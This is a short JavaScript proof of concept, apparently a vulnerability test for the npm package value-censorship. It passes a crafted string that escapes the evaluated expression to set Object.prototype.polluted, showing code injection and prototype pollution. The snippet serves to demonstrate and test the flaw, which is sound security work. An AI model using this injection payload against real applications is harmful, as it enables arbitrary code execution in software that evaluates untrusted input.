// test("Arbitrary code execution in  value-censorship", () => {
//   expect.assertions(2);
  const censor = require("value-censorship");
console.log({}.polluted);
  try {
    censor(`
        ;1 +(Object.prototype.polluted = 'yes')//
        `);
  } catch (error) {}
console.log({}.polluted);
// });
